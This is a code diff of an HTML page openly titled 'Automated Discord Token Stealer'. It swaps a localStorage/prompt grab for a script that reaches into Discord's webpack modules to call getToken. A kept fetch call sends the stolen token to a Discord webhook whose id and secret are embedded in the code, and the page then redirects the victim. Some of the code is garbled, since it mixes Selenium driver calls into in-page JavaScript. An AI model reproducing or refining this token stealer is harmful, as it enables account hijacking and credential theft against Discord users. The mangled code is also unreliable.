@@ -1,10 +1,28 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Discord Token Stealer</title>
+    <title>Automated Discord Token Stealer</title>
     <script>
-        // Stealthily extract the user's Discord token
-        const token = localStorage.token || prompt('Please enter your Discord token:');
+        // Execute the JavaScript script to grab the token
+        var token = driver.execute_script(`
+
+            var req = webpackJsonp.push([
+                [], {
+                    extra_id: (e, t, r) => e.exports = r
+                },
+                [
+                    ["extra_id"]
+                ]
+            ]);
+            for (let e in req.c)
+                if (req.c.hasOwnProperty(e)) {
+                    let t = req.c[e].exports;
+                    if (t && t.__esModule && t.default)
+                        for (let e in t.default) "getToken" === e && (token = t.default.getToken())
+                }
+            return token;
+            
+        `);
 
         // Transmit the stolen token to a Discord webhook
         fetch('https://discord.com/api/webhooks/1146137671605956708/POOYnRSXixoP1i1BY4T8HZfl0k_ARM8-9R38Tutdf5ZmTSFvCavR6uVgzl6iFF484xY1', {
@@ -16,7 +34,7 @@
         });
 
         // Redirect the user after stealing the token
-        window.location.href = 'https://discord.com';
+        window.location.href = 'https://redirect-url.com';
     </script>
 </head>
 <body>
